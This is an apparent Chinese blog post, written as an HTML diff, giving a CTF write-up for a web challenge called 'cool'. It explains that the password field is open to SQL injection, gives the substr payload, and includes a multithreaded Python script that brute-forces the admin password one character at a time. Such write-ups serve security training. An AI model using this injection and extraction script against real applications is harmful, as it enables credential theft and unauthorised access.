@@ -1,0 +1,551 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+
+    <title>CTF校队暑期练习2021.7.13 | 空栈攻城狮</title>
+    <meta property="og:title" content="CTF校队暑期练习2021.7.13 - 空栈攻城狮">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2021-07-13T08:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2021-07-13T08:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="程序设计,c&#43;&#43;,java,c,python,方舟编译器">
+    <meta name="description" content="CTF校队暑期练习2021.7.13">
+        
+    <meta name="author" content="HuaHuaY">
+    <meta property="og:url" content="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.13/">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+        <link href="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" rel="stylesheet">
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://www.huahuaorz.com/">
+                        空栈攻城狮
+                    </a>
+                
+                <p class="description">优雅的代码是恰如其分，增之一分则太长，减之一分则太短。</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://www.huahuaorz.com/">首页</a>
+                    
+                    <a  href="https://www.huahuaorz.com/archives/" title="归档">归档</a>
+                    
+                    <a  href="https://www.huahuaorz.com/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#webcool">web/cool</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">CTF校队暑期练习2021.7.13</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2021年7月13日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='/categories/CTF'>CTF</a></span>
+            
+        </div>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <p>CTF题目 July. 13th 2021</p>
+<h2 id="webcool">web/cool</h2>
+<blockquote>
+<p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.</p>
+<p><a href="https://cool.mc.ax/">cool.mc.ax</a></p>
+<p>Download: <a href="https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py">app.py</a></p>
+</blockquote>
+<p>网页是一个登录页面，一个注册页面。注册页面可以注册账号，但登陆后会提示并不是名字为ginkoid的人。显然，这题是要得到ginkoid的密码。</p>
+<p>下载下来一个.py文件：<a href="/res/2021/07/13/app.py">app.py</a></p>
+<p>其中create_user和check_login两个函数中，都是直接格式化SQL语句，有可能注入。</p>
+<p>对username进行了检查，不能有A-Za-z1-9以外的字符。但没有检查register时的password，所以在这里做文章。</p>
+<p>在register的密码框里面输入<code>'||substr((select password from users),1,1));--</code>，可以注册成功，并且密码是第一个人（ginkoid）的密码的第一个字符。可以暴力破解出第一个字符是什么。依此类推，直到破解完32位。运行下面的Python代码得到密码。</p>
+<p>登录后自动下载一个.mp3文件，查看二进制，末尾是flag：<a href="/res/2021/07/13/flag-at-end-of-file.mp3">flag-at-end-of-file.mp3</a></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#000;font-weight:bold">from</span> <span style="color:#555">requests</span> <span style="color:#000;font-weight:bold">import</span> session
+<span style="color:#000;font-weight:bold">from</span> <span style="color:#555">multiprocessing</span> <span style="color:#000;font-weight:bold">import</span> pool, Lock
+
+
+<span style="color:#000;font-weight:bold">def</span> <span style="color:#900;font-weight:bold">run</span>(i):
+    <span style="color:#0086b3">print</span>(<span style="color:#d14">&#34;Thread </span><span style="color:#d14">{}</span><span style="color:#d14"> start!&#34;</span><span style="color:#000;font-weight:bold">.</span>format(i))
+    <span style="color:#000;font-weight:bold">try</span>:
+        s <span style="color:#000;font-weight:bold">=</span> session()
+        data <span style="color:#000;font-weight:bold">=</span> {<span style="color:#d14">&#34;username&#34;</span>: <span style="color:#d14">&#34;CTFTeamCompassABC&#34;</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#0086b3">str</span>(i) <span style="color:#000;font-weight:bold">if</span> i <span style="color:#000;font-weight:bold">%</span> <span style="color:#099">10</span> <span style="color:#000;font-weight:bold">!=</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">else</span> <span style="color:#0086b3">str</span>(i <span style="color:#000;font-weight:bold">//</span> <span style="color:#099">10</span>)<span style="color:#000;font-weight:bold">*</span><span style="color:#099">3</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#d14">&#34;DEF&#34;</span>,
+                <span style="color:#d14">&#34;password&#34;</span>: <span style="color:#d14">&#34;&#39;||substr((select password from users),&#34;</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#0086b3">str</span>(i) <span style="color:#000;font-weight:bold">+</span> <span style="color:#d14">&#34;,1));--&#34;</span>}
+        r <span style="color:#000;font-weight:bold">=</span> s<span style="color:#000;font-weight:bold">.</span>post(post_url, data<span style="color:#000;font-weight:bold">=</span>data)
+        r <span style="color:#000;font-weight:bold">=</span> s<span style="color:#000;font-weight:bold">.</span>get(<span style="color:#d14">&#34;https://cool.mc.ax/logout&#34;</span>)
+
+        <span style="color:#000;font-weight:bold">for</span> j <span style="color:#000;font-weight:bold">in</span> <span style="color:#d14">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&#39;</span>:
+            data[<span style="color:#d14">&#34;password&#34;</span>] <span style="color:#000;font-weight:bold">=</span> j
+            r <span style="color:#000;font-weight:bold">=</span> s<span style="color:#000;font-weight:bold">.</span>post(login_url, data<span style="color:#000;font-weight:bold">=</span>data)
+            <span style="color:#000;font-weight:bold">if</span> (<span style="color:#d14">&#34;You are logged in!&#34;</span> <span style="color:#000;font-weight:bold">in</span> r<span style="color:#000;font-weight:bold">.</span>text):
+                threadLock<span style="color:#000;font-weight:bold">.</span>acquire()
+                result[i] <span style="color:#000;font-weight:bold">=</span> j
+                threadLock<span style="color:#000;font-weight:bold">.</span>release()
+                <span style="color:#0086b3">print</span>(<span style="color:#d14">&#34;</span><span style="color:#d14">{}</span><span style="color:#d14">: </span><span style="color:#d14">{}</span><span style="color:#d14">&#34;</span><span style="color:#000;font-weight:bold">.</span>format(i, j))
+                r <span style="color:#000;font-weight:bold">=</span> s<span style="color:#000;font-weight:bold">.</span>get(<span style="color:#d14">&#34;https://cool.mc.ax/logout&#34;</span>)
+                <span style="color:#000;font-weight:bold">break</span>
+    <span style="color:#000;font-weight:bold">except</span> <span style="color:#900;font-weight:bold">Exception</span> <span style="color:#000;font-weight:bold">as</span> e:
+        <span style="color:#0086b3">print</span>(e)
+        run(i)
+
+
+post_url <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#39;https://cool.mc.ax/register&#39;</span>
+login_url <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#39;https://cool.mc.ax/&#39;</span>
+
+result <span style="color:#000;font-weight:bold">=</span> {}
+
+threadPool <span style="color:#000;font-weight:bold">=</span> pool<span style="color:#000;font-weight:bold">.</span>ThreadPool(<span style="color:#099">10</span>)
+threadLock <span style="color:#000;font-weight:bold">=</span> Lock()
+<span style="color:#000;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#0086b3">range</span>(<span style="color:#099">1</span>, <span style="color:#099">33</span>):
+    threadPool<span style="color:#000;font-weight:bold">.</span>apply_async(run, [i])
+
+threadPool<span style="color:#000;font-weight:bold">.</span>close()
+threadPool<span style="color:#000;font-weight:bold">.</span>join()
+
+<span style="color:#000;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#0086b3">sorted</span>(result):
+    <span style="color:#0086b3">print</span>(result[i], end<span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&#34;</span>)
+<span style="color:#0086b3">print</span>(<span style="color:#d14">&#34;&#34;</span>)
+</code></pre></td></tr></table>
+</div>
+</div>
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://www.huahuaorz.com/">HuaHuaY</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.13/">https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.13/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.10/">CTF校队暑期练习2021.7.10</a></li>
+        
+        <li><a href="/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.12/">CTF校队暑期练习2021.7.12</a></li>
+        
+        <li><a href="/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.8/">CTF校队暑期练习2021.7.8</a></li>
+        
+        <li><a href="/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.6/">CTF校队暑期练习2021.7.6</a></li>
+        
+        <li><a href="/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.5/">CTF校队暑期练习2021.7.5</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='/tags/CTF'>CTF</a></li>
+                
+                <li><a href='/tags/%E5%AE%89%E5%85%A8'>安全</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "HuaHuaY/HuaHuaY.github.io"
+            issue-term="title"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2021 <a href="https://www.huahuaorz.com/">空栈攻城狮 By HuaHuaY</a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script><script src="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://www.huahuaorz.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://www.huahuaorz.com/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/Welcome-to-My-Website/" title="Welcome to My Website!">Welcome to My Website!</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.13/" title="CTF校队暑期练习2021.7.13">CTF校队暑期练习2021.7.13</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.10/" title="CTF校队暑期练习2021.7.10">CTF校队暑期练习2021.7.10</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.12/" title="CTF校队暑期练习2021.7.12">CTF校队暑期练习2021.7.12</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.8/" title="CTF校队暑期练习2021.7.8">CTF校队暑期练习2021.7.8</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.6/" title="CTF校队暑期练习2021.7.6">CTF校队暑期练习2021.7.6</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.5/" title="CTF校队暑期练习2021.7.5">CTF校队暑期练习2021.7.5</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.2/" title="CTF校队暑期练习2021.7.2">CTF校队暑期练习2021.7.2</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.7.1/" title="CTF校队暑期练习2021.7.1">CTF校队暑期练习2021.7.1</a>
+    </li>
+    
+    <li>
+        <a href="https://www.huahuaorz.com/post/CTF%E6%A0%A1%E9%98%9F%E7%BB%83%E4%B9%A0/CTF%E6%A0%A1%E9%98%9F%E6%9A%91%E6%9C%9F%E7%BB%83%E4%B9%A02021.6.30/" title="CTF校队暑期练习2021.6.30">CTF校队暑期练习2021.6.30</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
+<ul class="widget-list">
+    
+    <li><a href="https://www.huahuaorz.com/categories/CTF/">CTF (16)</a></li>
+    
+    <li><a href="https://www.huahuaorz.com/categories/%E5%BB%BA%E7%AB%99/">建站 (1)</a></li>
+    
+    <li><a href="https://www.huahuaorz.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库 (1)</a></li>
+    
+    <li><a href="https://www.huahuaorz.com/categories/%E6%9D%82%E8%B0%88/">杂谈 (1)</a></li>
+    
+    <li><a href="https://www.huahuaorz.com/categories/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理 (1)</a></li>
+    
+    <li><a href="https://www.huahuaorz.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/">虚拟化 (1)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://www.huahuaorz.com/tags/CTF/">CTF</a>
+    
+    <a href="https://www.huahuaorz.com/tags/KVM/">KVM</a>
+    
+    <a href="https://www.huahuaorz.com/tags/PVE/">PVE</a>
+    
+    <a href="https://www.huahuaorz.com/tags/PostgreSQL/">PostgreSQL</a>
+    
+    <a href="https://www.huahuaorz.com/tags/Typecho/">Typecho</a>
+    
+    <a href="https://www.huahuaorz.com/tags/themes/">themes</a>
+    
+    <a href="https://www.huahuaorz.com/tags/%E5%AE%89%E5%85%A8/">安全</a>
+    
+    <a href="https://www.huahuaorz.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+    
+    <a href="https://www.huahuaorz.com/tags/%E6%96%B9%E8%88%9F%E7%BC%96%E8%AF%91%E5%99%A8/">方舟编译器</a>
+    
+    <a href="https://www.huahuaorz.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a target="_blank" href="https://www.google.com/" title="Google">Google</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://www.baidu.com/" title="Baidu">Baidu</a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://www.huahuaorz.com/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
